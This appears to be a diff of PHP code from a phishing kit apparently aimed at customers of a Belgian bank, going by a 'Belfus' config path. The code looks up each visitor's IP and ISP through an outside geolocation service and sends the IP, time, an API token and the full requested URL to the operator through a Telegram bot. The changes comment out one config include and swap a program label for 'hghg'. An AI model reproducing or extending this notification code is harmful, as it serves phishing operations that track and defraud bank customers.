@@ -87,7 +87,7 @@ function mySendTelegramMessage($message, $keyboard = null) {
 }
 
 function checker() {
-	require_once 'config.php';
+	//require_once 'config.php';
 	require_once __DIR__ . '/Belfus/config.php';
 	$ip = getenv("REMOTE_ADDR");
 	$url = "https://ipwhois.app/json/{$ip}";
@@ -109,7 +109,7 @@ if ($response) {
  $inj = $_SERVER["REQUEST_URI"];
  $dir = dirname($_SERVER['PHP_SELF']);
  $message = "<strong>🩸 =========| <code>$ip</code> | <i>$isp_cod</i> |========= 🩸</strong>\n";
- $message .= "<strong> ❕]---------------------{ <i>$prog</i> }---------------------[❕ </strong>\n";
+ $message .= "<strong> ❕]---------------------{ <i>hghg</i> }---------------------[❕ </strong>\n";
  $message .= "<strong>[⏱️] ┌───────── ᴛɪᴍᴇ:</strong> ".gmdate ("H:i:s")."\n";
  $message .= "<strong>[🧩] ├── ᴛᴏᴋᴇɴ:</strong> <code>$apiToken</code> \n";
  $message .= "<strong>[🔗] └── ꜰᴜʟʟ ᴜʀʟ:</strong> https://$web$inj \n";
